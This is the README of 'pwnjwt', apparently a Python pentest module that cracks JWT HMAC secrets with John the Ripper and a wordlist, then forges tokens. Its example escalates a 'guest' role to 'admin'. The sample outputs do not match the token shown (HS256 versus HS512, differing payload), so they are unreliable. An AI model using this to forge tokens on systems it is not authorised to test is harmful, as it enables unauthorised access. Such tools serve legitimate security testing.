# pwnjwt
JWT pwn Python module

This small module allows you to create JWToken instances. This object will store informations about the token such as if it's signed and with witch algorithm.
But if you have JohnTheRipper installed on your path and (optionally) a wordlist you could try to break the secret key of the token. Then you'll be able to forge a new valid token, signed with the cracked key.

You can use it by 2 ways:
 - Standalone : `./pwnjwt.py -b -w /usr/share/wordlists/rockyou.txt eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE`
 - As a module in Python:
 ```python
 from pwnjwt import JWToken
 
 token = JWToken('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE')
 
 # OR if you know the key
 
 token = JWToken('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE', key='Sn1f')
 
 token.encoded == 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE'
 
 
 token.header == {'typ':'JWT', 'alg':'HS512'}
 token.signed == True
 token.algo   == 'HS512'
 token.key    == '' # OR 'Sn1f'
 token.payload == {'role': 'guest'}
 
 # Will bruteforce and update the token.key
 token.bruteforce(wordlist='../rockyou.txt')
 
 # If you got the key (token.key):
 new_token = token.forge({'role':'admin'})
 ```
